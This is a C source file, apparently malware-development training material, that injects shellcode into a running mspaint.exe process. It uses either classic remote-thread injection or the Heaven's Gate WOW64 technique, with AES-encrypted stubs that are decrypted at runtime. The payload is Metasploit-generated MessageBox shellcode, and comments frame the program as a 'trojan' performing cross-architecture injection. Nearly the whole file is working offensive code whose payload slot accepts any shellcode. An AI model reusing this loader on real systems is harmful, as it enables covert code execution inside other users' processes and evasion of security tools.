#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment(lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")


// MessageBox shellcode - 64-bit generated using metasploit on kali
unsigned char payload_64_bit[355] = {
	0xFC, 0x48, 0x81, 0xE4, 0xF0, 0xFF, 0xFF, 0xFF, 0xE8, 0xD0, 0x00, 0x00,
	0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65,
	0x48, 0x8B, 0x52, 0x60, 0x3E, 0x48, 0x8B, 0x52, 0x18, 0x3E, 0x48, 0x8B,
	0x52, 0x20, 0x3E, 0x48, 0x8B, 0x72, 0x50, 0x3E, 0x48, 0x0F, 0xB7, 0x4A,
	0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02,
	0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52,
	0x41, 0x51, 0x3E, 0x48, 0x8B, 0x52, 0x20, 0x3E, 0x8B, 0x42, 0x3C, 0x48,
	0x01, 0xD0, 0x3E, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0,
	0x74, 0x6F, 0x48, 0x01, 0xD0, 0x50, 0x3E, 0x8B, 0x48, 0x18, 0x3E, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x5C, 0x48, 0xFF, 0xC9, 0x3E,
	0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31,
	0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75,
	0xF1, 0x3E, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD6,
	0x58, 0x3E, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x3E, 0x41,
	0x8B, 0x0C, 0x48, 0x3E, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x3E,
	0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E,
	0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20,
	0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x3E, 0x48, 0x8B, 0x12,
	0xE9, 0x49, 0xFF, 0xFF, 0xFF, 0x5D, 0x3E, 0x48, 0x8D, 0x8D, 0x4B, 0x01,
	0x00, 0x00, 0x41, 0xBA, 0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x49, 0xC7,
	0xC1, 0x10, 0x00, 0x00, 0x00, 0x3E, 0x48, 0x8D, 0x95, 0x2A, 0x01, 0x00,
	0x00, 0x3E, 0x4C, 0x8D, 0x85, 0x42, 0x01, 0x00, 0x00, 0x48, 0x31, 0xC9,
	0x41, 0xBA, 0x45, 0x83, 0x56, 0x07, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A,
	0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4,
	0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x48,
	0x65, 0x6C, 0x6C, 0x6F, 0x2C, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x74,
	0x68, 0x65, 0x20, 0x46, 0x55, 0x54, 0x55, 0x52, 0x45, 0x21, 0x00, 0x47,
	0x4F, 0x54, 0x20, 0x59, 0x4F, 0x55, 0x21, 0x00, 0x75, 0x73, 0x65, 0x72,
	0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00
};

unsigned int payload_64_bit_length = 355;

// MessageBox shellcode - 32-bit generated using metasploit on kali
unsigned char payload_32_bit[253] = {
	0xD9, 0xEB, 0x9B, 0xD9, 0x74, 0x24, 0xF4, 0x31, 0xD2, 0xB2, 0x77, 0x31,
	0xC9, 0x64, 0x8B, 0x71, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B,
	0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x38, 0x4F, 0x18, 0x75, 0xF3,
	0x59, 0x01, 0xD1, 0xFF, 0xE1, 0x60, 0x8B, 0x6C, 0x24, 0x24, 0x8B, 0x45,
	0x3C, 0x8B, 0x54, 0x28, 0x78, 0x01, 0xEA, 0x8B, 0x4A, 0x18, 0x8B, 0x5A,
	0x20, 0x01, 0xEB, 0xE3, 0x34, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xEE, 0x31,
	0xFF, 0x31, 0xC0, 0xFC, 0xAC, 0x84, 0xC0, 0x74, 0x07, 0xC1, 0xCF, 0x0D,
	0x01, 0xC7, 0xEB, 0xF4, 0x3B, 0x7C, 0x24, 0x28, 0x75, 0xE1, 0x8B, 0x5A,
	0x24, 0x01, 0xEB, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x5A, 0x1C, 0x01, 0xEB,
	0x8B, 0x04, 0x8B, 0x01, 0xE8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xB2,
	0x08, 0x29, 0xD4, 0x89, 0xE5, 0x89, 0xC2, 0x68, 0x8E, 0x4E, 0x0E, 0xEC,
	0x52, 0xE8, 0x9F, 0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x04, 0xBB, 0xEF, 0xCE,
	0xE0, 0x60, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x8E, 0xFF, 0xFF, 0xFF, 0x89,
	0x45, 0x08, 0x68, 0x6C, 0x6C, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2E, 0x64,
	0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xDB, 0x88, 0x5C, 0x24, 0x0A, 0x89,
	0xE6, 0x56, 0xFF, 0x55, 0x04, 0x89, 0xC2, 0x50, 0xBB, 0xA8, 0xA2, 0x4D,
	0xBC, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x5F, 0xFF, 0xFF, 0xFF, 0x68, 0x58,
	0x20, 0x20, 0x20, 0x68, 0x48, 0x69, 0x69, 0x69, 0x31, 0xDB, 0x88, 0x5C,
	0x24, 0x04, 0x89, 0xE3, 0x68, 0x6F, 0x58, 0x20, 0x20, 0x68, 0x68, 0x65,
	0x6C, 0x6C, 0x31, 0xC9, 0x88, 0x4C, 0x24, 0x05, 0x89, 0xE1, 0x31, 0xD2,
	0x6A, 0x10, 0x53, 0x51, 0x52, 0xFF, 0xD0, 0x31, 0xC0, 0x50, 0xFF, 0x55,
	0x08
};
unsigned int payload_32_bit_length = 253;

int DecryptAES(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );

//-- This struct is used in X64FUNCTION (remotethread)
typedef struct _WOW64CONTEXT {
        union   {
                HANDLE hProcess;
                BYTE bPadding2[8];
        } h;

        union   {
                LPVOID lpStartAddress;
                BYTE bPadding1[8];
        } s;

        union   {
                LPVOID lpParameter;
                BYTE bPadding2[8];
        } p;
        union   {
                HANDLE hThread;
                BYTE bPadding2[8];
        } t;
} WOW64CONTEXT, * LPWOW64CONTEXT;


int SearchForTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

//-- classic injection without using Heaven's Gate
int ClassicInject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;


	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	
	printf("Thread Handle = %x\n", hThread);
	
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}

//-- Using Heaven's Gate technique
int HeavensGateInject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	EXECUTEX64 pExecuteX64   = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx       = NULL;


	//-- executex64_shellcode function (switches to 64-bit mode and runs x64function_shellcode)
	unsigned char executex64_shellcode[] = { 0xdb, 0x58, 0xcd, 0x6, 0x9a, 0xf3, 0x2, 0xc8, 0xa0, 0x97, 0xab, 0xa2, 0x9f, 0x1e, 0xb3, 0xa7, 0xd9, 0x84, 0xba, 0xc2, 0x79, 0xf, 0xe6, 0x15, 0xa, 0xae, 0xbf, 0xf8, 0x2e, 0xfa, 0x32, 0x13, 0x75, 0xe7, 0xb1, 0x4, 0x6b, 0x25, 0xb, 0x70, 0x96, 0x66, 0x29, 0xd2, 0xb9, 0x1b, 0xc4, 0x4d, 0x69, 0xc5, 0x33, 0x5a, 0x92, 0x2e, 0x27, 0xb8, 0x15, 0xab, 0x3e, 0x9e, 0x9, 0x23, 0x34, 0x85, 0xb0, 0x75, 0xa5, 0xf1, 0x9a, 0x29, 0x8c, 0x15, 0x76, 0x66, 0x51, 0x85, 0x7a, 0xb6, 0x50, 0x13, 0xdf, 0xbf, 0xd9, 0x9a, 0xd9, 0xad, 0x57, 0xd4, 0x42, 0x99, 0x90, 0x50, 0xe9, 0x73, 0x56, 0x26 };

							
	unsigned int executex64_shellcode_length = sizeof(executex64_shellcode);
	
	unsigned char executex64_key[] = { 0x4c, 0x42, 0x52, 0x25, 0xa4, 0x61, 0xe0, 0x61, 0xb6, 0xdf, 0xbd, 0x79, 0x8e, 0xf3, 0x2f, 0xfc };

	size_t executex64_key_len = sizeof(executex64_key);

	//-- x64function (calling RtlCreateUserThread in target process)
	unsigned char x64function_shellcode[] = { 0x9c, 0x8a, 0x85, 0x2c, 0x8c, 0x33, 0xc3, 0x71, 0xf, 0xa5, 0x4c, 0x3d, 0x7f, 0x2c, 0xe4, 0xd5, 0xb2, 0x6, 0x9f, 0xf2, 0x7e, 0xe6, 0x4b, 0x7d, 0xad, 0x48, 0xa5, 0xb4, 0x3f, 0x96, 0xf6, 0xeb, 0x6e, 0x30, 0xb3, 0xe3, 0xe6, 0x9e, 0x5d, 0xef, 0x2f, 0xc2, 0xb5, 0xa0, 0x81, 0x94, 0x46, 0xe6, 0x54, 0x35, 0x4f, 0x38, 0x9a, 0xe4, 0xa2, 0x7c, 0x0, 0x5c, 0x8b, 0xaa, 0x5e, 0xfc, 0xa9, 0x70, 0xad, 0x7d, 0xa2, 0x72, 0x7e, 0xc4, 0xdb, 0x8c, 0xeb, 0x29, 0x84, 0x98, 0xf5, 0x38, 0x9c, 0x9b, 0xff, 0xb3, 0x58, 0x35, 0xac, 0xe5, 0xba, 0xfb, 0xc6, 0x91, 0xe7, 0x8b, 0xe4, 0x83, 0xf, 0x20, 0x93, 0x1d, 0x66, 0xad, 0x10, 0xcb, 0xc4, 0x6f, 0x6e, 0x2, 0x8a, 0x41, 0x48, 0x25, 0x17, 0xd6, 0x9b, 0x6d, 0x65, 0x1f, 0x55, 0x4f, 0x52, 0x5a, 0xcb, 0x4a, 0x46, 0xf6, 0x5a, 0xc5, 0xb, 0x45, 0x42, 0xd, 0xd7, 0xcf, 0x92, 0xbb, 0xb8, 0x9a, 0xf2, 0x71, 0xf, 0x45, 0xfe, 0x88, 0xc7, 0xb9, 0x5c, 0xe9, 0x60, 0x99, 0x16, 0xd8, 0x4, 0x15, 0x66, 0x2d, 0x51, 0x76, 0x51, 0x35, 0x13, 0xfb, 0xba, 0x49, 0xa8, 0xa, 0x64, 0xe3, 0xbc, 0x74, 0xf6, 0x47, 0x7a, 0xbf, 0x2e, 0xf1, 0x59, 0x37, 0xd0, 0xb5, 0x93, 0xdc, 0x7d, 0xe6, 0x14, 0xc7, 0xd7, 0x56, 0x60, 0xa5, 0x74, 0x7, 0xd8, 0xb2, 0x2f, 0x81, 0xb8, 0x64, 0x11, 0x11, 0xfb, 0x57, 0xd0, 0x9c, 0x30, 0x5a, 0x91, 0x69, 0xd9, 0x2e, 0xba, 0x24, 0xef, 0x8a, 0x8, 0xf7, 0x13, 0xbb, 0xd1, 0x33, 0x37, 0x6, 0x7b, 0x4c, 0xb3, 0xa0, 0x4, 0x8d, 0x19, 0xe4, 0x67, 0x4b, 0xbc, 0x44, 0x8c, 0xde, 0xb2, 0xb1, 0x7f, 0x60, 0x53, 0x23, 0x1e, 0x4, 0xc0, 0xed, 0xf5, 0xe8, 0xe7, 0x81, 0x85, 0x39, 0xfa, 0x5b, 0x75, 0x9f, 0x26, 0x42, 0xa, 0xb8, 0x6c, 0x1a, 0x55, 0xf5, 0xf1, 0xe4, 0x16, 0xcf, 0xc7, 0xa2, 0x57, 0xc1, 0x40, 0xf5, 0x2c, 0x1b, 0xa8, 0x56, 0x92, 0x47, 0x9b, 0x92, 0x71, 0x8e, 0xe3, 0xd6, 0xa6, 0x2c, 0xfc, 0xd7, 0x2a, 0x76, 0x61, 0xf0, 0xb0, 0x4a, 0xd2, 0x98, 0x16, 0x3, 0x1b, 0xe5, 0x37, 0x67, 0xb6, 0x4f };
	
	unsigned int x64function_shellcode_length = sizeof(x64function_shellcode);
	
	unsigned char x64function_key[] = { 0x47, 0x7d, 0x11, 0x9a, 0x2d, 0xb, 0x94, 0x7f, 0x5, 0xa6, 0x19, 0xef, 0x8a, 0x84, 0xa4, 0x6d };
	size_t x64function_key_len = sizeof(x64function_key);

	//-- inject payload into target process
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	printf("remote code = %p\nPress enter to continue...\n", pRemoteCode); 
	getchar();
	
	//-- allocate a RW buffer in this process for the EXECUTEX64 function
	pExecuteX64 = (EXECUTEX64)VirtualAlloc( NULL, sizeof(executex64_shellcode), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
	// alloc a RW buffer in this process for the X64FUNCTION function (and its context)
	pX64function = (X64FUNCTION)VirtualAlloc( NULL, sizeof(x64function_shellcode)+sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );

	printf("pExecuteX64 = %p ; pX64function = %p\nPress Enter to continue...\n", pExecuteX64, pX64function); 
	getchar();

	//-- [optional] insert decryption code here if executex64 shellcode was encrypted --
	DecryptAES((char *) executex64_shellcode, executex64_shellcode_length, (char *) executex64_key, executex64_key_len);
	memcpy( pExecuteX64, executex64_shellcode, executex64_shellcode_length );
	VirtualAlloc( pExecuteX64, sizeof(executex64_shellcode), MEM_COMMIT, PAGE_EXECUTE_READ );

	//-- [optional] insert decryption code here if x64function shellcode was encrypted --
	DecryptAES((char *) x64function_shellcode, x64function_shellcode_length, (char *) x64function_key, x64function_key_len);
	memcpy( pX64function, x64function_shellcode, x64function_shellcode_length );

	// pX64function shellcode modifies itself during the runtime, so memory has to be RWX
	VirtualAlloc( pX64function, sizeof(x64function_shellcode)+sizeof(WOW64CONTEXT), MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	// set the context
	ctx = (WOW64CONTEXT *)( (BYTE *)pX64function + x64function_shellcode_length );

	ctx->h.hProcess       = hProc;
	ctx->s.lpStartAddress = pRemoteCode;
	ctx->p.lpParameter    = 0;
	ctx->t.hThread        = NULL;
	
	// run a new thread in target process
	pExecuteX64( pX64function, (DWORD)ctx );
	
	if( ctx->t.hThread ) {
		// if success, resume the thread -> execute payload
		printf("Thread created but in suspended state\nPress enter to ResumeThread()..."); 
		getchar();
		ResumeThread(ctx->t.hThread);

		// cleanup in target process
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
		VirtualFree(pX64function, 0, MEM_RELEASE);

		return 0;
	}
	else
		return 1;
}


/*

-- The Four Types of Cross Injections: --
[] 64-bit trojan [with 64-bit payload] --> 64-bit target
[] 32-bit trojan [with 32-bit payload] --> 32-bit target
[] 64-bit trojan [with 32-bit payload] --> 32-bit target
[] 32-bit trojan [with 64-bit payload] --> 64-bit target

*/

int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = SearchForTarget("mspaint.exe");

	if (pid) {
		printf("mspaint.exe PID = %d\n", pid);

		//-- open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			//-- either use ClassicInject(), or, HeavensGateInject()
			//-- payload can be either, payload_64_bit with payload_64_bit_length
			//--                    or, payload_32_bit with payload_32_bit_length
			//ClassicInject(hProc, payload_64_bit, payload_64_bit_length);
			HeavensGateInject(hProc, payload_64_bit, payload_64_bit_length);
			CloseHandle(hProc);
		}
	}
	return 0;
}
